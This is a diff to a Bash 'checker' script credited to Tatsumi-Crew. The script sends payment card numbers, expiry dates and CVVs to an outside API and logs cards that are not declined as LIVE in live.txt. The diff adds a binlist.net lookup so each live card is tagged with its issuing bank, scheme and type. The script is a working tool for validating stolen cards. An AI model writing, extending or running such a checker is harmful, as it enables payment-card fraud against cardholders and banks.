@@ -1,3 +1,4 @@
+
 #!/bin/bash
 #Tatsumi-Crew & Arvan Apriyana
 clear
@@ -12,7 +13,6 @@ PUTIH='\033[1;37m'
 printf "
 ${PUTIH}
 ___________________________________________________________
-
  ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
  ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
     ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
@@ -32,7 +32,11 @@ tatsumi(){
     duration=$SECONDS
     SECONDS=0
     curlnya=$(curl -s "http://api.nakocoders.org/index.php?num=$1&bulan=$2&tahun=$3&ccvna=$4" -L)
+    binna=$(curl -s "https://lookup.binlist.net/$1" -L)
     livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
+    bincc=$(echo $binna | grep -Po '(?<="name":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
+	scheme1=$(echo $binna | grep -Po '(?<="scheme":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
+	typena1=$(echo $binna | grep -Po '(?<="type":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     if [[ ! $livena =~ "card_declined" ]]; then
         printf "\n$1|$2|$3|$4 ${HIJAU}[LIVE] [$bincc/$scheme1-$typena1] [$waktu]\n";
         echo "$1|$2|$3|$4 [LIVE] [$bincc/$scheme1-$typena1] [$waktu]" >> live.txt
@@ -42,8 +46,6 @@ tatsumi(){
         echo ""
         printf "${NORMAL}"
     fi
-}
-
 }
 header
 echo ""
